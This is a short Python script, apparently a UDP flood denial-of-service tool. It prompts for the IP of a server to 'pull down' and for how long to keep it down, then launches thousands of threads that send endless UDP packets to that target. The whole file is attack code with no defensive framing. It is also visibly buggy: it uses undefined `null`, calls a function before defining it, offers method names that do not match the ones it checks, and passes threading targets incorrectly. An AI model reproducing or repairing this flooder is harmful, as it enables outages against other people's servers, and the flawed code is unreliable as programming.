from asyncore import loop
from contextlib import nullcontext
import sys
import socket
import threading
import time as clock
from asyncore import loop

host = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
method = str(sys.argv[4])

if host == null or port == null or time == null or method == null:
    setup()

loops = 10000

def setup():
    global host
    global port
    global time
    global method
    
    host = input("[!] Enter the IP of the server you'd like to pull down (127.0.0.1): ")
    port = input("[!] Enter the Port of the server (80): ")
    time = input("[!] For how many seconds would you like to keep this server down? (20): ")
    method = input("[!] What UDP method would you like to use? [UDPMix, UDPFlood, UDPPower] (UDPMix): ")

    if host == null:
        host = "127.0.0.1"
    if port == null:
        port = "80"
    if time == null:
        time = "20"
    if method == null:
        method = "UDPMix"

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

def timer(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)

def attack_HQ():
    timeout = clock.time() + time
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), daemon=True).start()
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(750), daemon=True).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375), daemon=True).start()
            threading.Thread(target=send_packet(750), daemon=True).start()
    timer(timeout)

attack_HQ()